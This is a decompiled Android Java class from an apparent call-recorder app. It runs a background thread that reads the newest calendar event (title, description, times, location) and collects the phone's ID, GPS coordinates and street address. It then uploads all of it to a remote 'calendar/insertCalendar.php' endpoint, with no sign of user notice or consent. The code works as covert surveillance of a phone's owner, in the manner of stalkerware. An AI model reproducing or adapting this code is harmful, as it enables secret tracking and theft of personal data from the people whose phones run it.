package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.b.C0082n;
import a.c.e.e;
import a.c.j.c;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.provider.CalendarContract.Events;
import androidx.core.content.ContextCompat;
import com.app.received.LocationReceived;
import com.crashlytics.android.Crashlytics;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: CalendarApp */
public class b extends Thread {

    /* renamed from: c reason: collision with root package name */
    static String f211c = "";

    /* renamed from: a reason: collision with root package name */
    public String f212a = "";

    /* renamed from: b reason: collision with root package name */
    Context f213b;

    public b(Context context) {
        this.f213b = context;
    }

    private String a(String str) {
        try {
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.reset();
            instance.update(str.getBytes());
            byte[] digest = instance.digest();
            int length = digest.length;
            StringBuilder sb = new StringBuilder(length << 1);
            for (int i = 0; i < length; i++) {
                sb.append(Character.forDigit((digest[i] & 240) >> 4, 16));
                sb.append(Character.forDigit(digest[i] & 15, 16));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e2) {
            e2.getStackTrace();
            return str;
        }
    }

    @SuppressLint({"NewApi"})
    public void run() {
        String str = "eventLocation";
        String str2 = "dtend";
        String str3 = "dtstart";
        String str4 = "description";
        String str5 = "title";
        String str6 = "android.permission.READ_CALENDAR";
        try {
            Thread.sleep(1000);
            StringBuilder sb = new StringBuilder();
            sb.append("");
            Context context = this.f213b;
            long j = 0;
            if (ContextCompat.checkSelfPermission(context, str6) == 0) {
                Cursor query = context.getContentResolver().query(Events.CONTENT_URI, new String[]{"MAX(_id) as max_id"}, null, null, "_id");
                if (query != null) {
                    if (query.moveToFirst()) {
                        j = query.getLong(query.getColumnIndex("max_id"));
                    }
                    query.close();
                }
            }
            sb.append(j);
            String sb2 = sb.toString();
            if (!sb2.equals("0")) {
                ContentResolver contentResolver = this.f213b.getContentResolver();
                Uri uri = Events.CONTENT_URI;
                if (ContextCompat.checkSelfPermission(this.f213b, str6) == 0) {
                    String[] strArr = {"calendar_id", "_id", str5, str4, str3, str2, str};
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("_id=");
                    sb3.append(sb2);
                    Cursor query2 = contentResolver.query(uri, strArr, sb3.toString(), null, null);
                    if (query2 != null) {
                        if (query2.moveToLast()) {
                            String string = query2.getString(query2.getColumnIndex(str5));
                            String string2 = query2.getString(query2.getColumnIndexOrThrow(str4));
                            Date date = new Date(query2.getLong(query2.getColumnIndex(str3)));
                            Date date2 = new Date(query2.getLong(query2.getColumnIndex(str2)));
                            String string3 = query2.getString(query2.getColumnIndex(str));
                            StringBuilder sb4 = new StringBuilder();
                            StringBuilder sb5 = new StringBuilder();
                            sb5.append(sb2);
                            sb5.append(string);
                            sb5.append(date);
                            sb4.append(a(sb5.toString()));
                            sb4.append(" ");
                            this.f212a = sb4.toString();
                            if (!f211c.contains(this.f212a)) {
                                StringBuilder sb6 = new StringBuilder();
                                sb6.append(f211c);
                                sb6.append(this.f212a);
                                f211c = sb6.toString();
                                a(string, string2, date, date2, string3, this.f213b);
                            }
                        }
                        query2.close();
                    }
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    @SuppressLint({"NewApi"})
    private void a(String str, String str2, Date date, Date date2, String str3, Context context) {
        double d2;
        double d3;
        Date date3 = date;
        Date date4 = date2;
        Location a2 = LocationReceived.a();
        double d4 = 0.0d;
        if (a2 != null) {
            d4 = a2.getLongitude();
            d3 = a2.getLatitude();
            d2 = (double) a2.getAccuracy();
        } else {
            d3 = 0.0d;
            d2 = 0.0d;
        }
        String a3 = LocationReceived.a(context);
        SimpleDateFormat d5 = c.d();
        String b2 = c.b();
        HashMap hashMap = new HashMap();
        String str4 = "";
        StringBuilder a4 = a.a(str4);
        a4.append(e.e(context));
        hashMap.put("idPhone", a4.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str4);
        sb.append(str);
        hashMap.put("title", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str4);
        sb2.append(str2);
        hashMap.put("description", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str4);
        sb3.append(d5.format(date3));
        hashMap.put("dateStart", sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str4);
        sb4.append(d5.format(date4));
        hashMap.put("dateEnd", sb4.toString());
        StringBuilder sb5 = new StringBuilder();
        sb5.append(str4);
        sb5.append(str3);
        hashMap.put("locationEvent", sb5.toString());
        StringBuilder sb6 = new StringBuilder();
        sb6.append(str4);
        sb6.append(b2);
        hashMap.put("date", sb6.toString());
        StringBuilder sb7 = new StringBuilder();
        sb7.append(str4);
        sb7.append(a3);
        hashMap.put("address", sb7.toString());
        StringBuilder sb8 = new StringBuilder();
        sb8.append(str4);
        sb8.append(d4);
        hashMap.put("longitude", sb8.toString());
        StringBuilder sb9 = new StringBuilder();
        sb9.append(str4);
        sb9.append(d3);
        hashMap.put("latitude", sb9.toString());
        StringBuilder sb10 = new StringBuilder();
        sb10.append(str4);
        sb10.append(d2);
        hashMap.put("accuracy", sb10.toString());
        try {
            String format = d5.format(date3);
            String format2 = d5.format(date4);
            StringBuilder sb11 = new StringBuilder();
            sb11.append(str4);
            sb11.append(d4);
            String sb12 = sb11.toString();
            StringBuilder sb13 = new StringBuilder();
            sb13.append(str4);
            sb13.append(d3);
            String sb14 = sb13.toString();
            StringBuilder sb15 = new StringBuilder();
            sb15.append(str4);
            sb15.append(d2);
            String str5 = format2;
            HashMap hashMap2 = hashMap;
            long a5 = a.a.a(str, str2, format, str5, str3, b2, a3, sb12, sb14, sb15.toString(), context);
            if (a.c.e.a.b("calendar/insertCalendar.php", (Map<String, String>) hashMap2)) {
                int i = (int) a5;
                try {
                    C0082n nVar = new C0082n(context);
                    nVar.b();
                    nVar.a(i);
                    nVar.a();
                } catch (Exception e2) {
                    try {
                        e2.getStackTrace();
                        Crashlytics.logException(e2);
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            Crashlytics.logException(e3);
        }
    }
}
